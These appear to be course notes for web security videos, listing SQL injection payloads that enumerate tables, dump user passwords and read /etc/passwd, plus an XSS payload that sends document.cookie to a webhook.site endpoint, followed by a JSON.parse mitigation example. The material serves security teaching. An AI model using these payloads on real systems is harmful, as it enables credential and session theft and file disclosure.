# Video 7.2

* [[OWASP] A03:2021 - Injection](https://owasp.org/Top10/A03_2021-Injection)
* [[OWASP] WSTG: Input Validation Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/)

# Video 7.3

## Various payloads

```sql
-- Dump all users
' or '0'='0
```
```sql
-- Dicover number of columns in a result - increase null columns in union until error disappears
' union select null, ..., null#
```
```sql
-- Get DB version
' union select null,@@version#
```
* [More system variables](https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html)
```sql
-- Check user that runs the database and db name
' union select user(),database()#
```
```sql
-- Enumerate available tables
' union select null, table_name from information_schema.tables #
```
```sql
-- Enumerabe columns from users table
' union select null,column_name from information_schema.columns where table_name='users' #
```
```sql
-- Exfiltrate users passwords using concat when more columns needed
-- 0x20 space
-- 0x0a newline character
-- 0x3a semicolon
' union select concat(user_id,0x0a,first_name,0x20,last_name),concat(user,0x3a,password) from users #
```
```sql
-- Read file
' union all select load_file(‘/etc/passwd’),null #
```

# Video 7.4

* [Selenium WebDriver](https://www.npmjs.com/package/selenium-webdriver)

* Payload for XSS on JSON injection excercise.

```js
//replace with your own endpoint
var payload = 'Neat site"});fetch("https://webhook.site/4fc9cc8e-c8cc-XXXX-a385-607ef4351cd2",{method: "POST", body:document.cookie});({ "time": "2022-02-29", "who": "Friend", "body": "Neat site';
```

# Video 7.5

```js
// JSON Injection Mitigation
var p = '{ "time": "2022-03-26", "who": "Joe", "body": "Neat site"});alert(document.domain);({ "time": "2022-02-29", "who": "Friend", "body": "Neat site" }'
eval(`(${p})`);
JSON.parse(p); //throws parsing error


var p = '{ "time": "2022-03-26", "who": "Joe", "body": "Neat site"}';
JSON.parse(p);
```
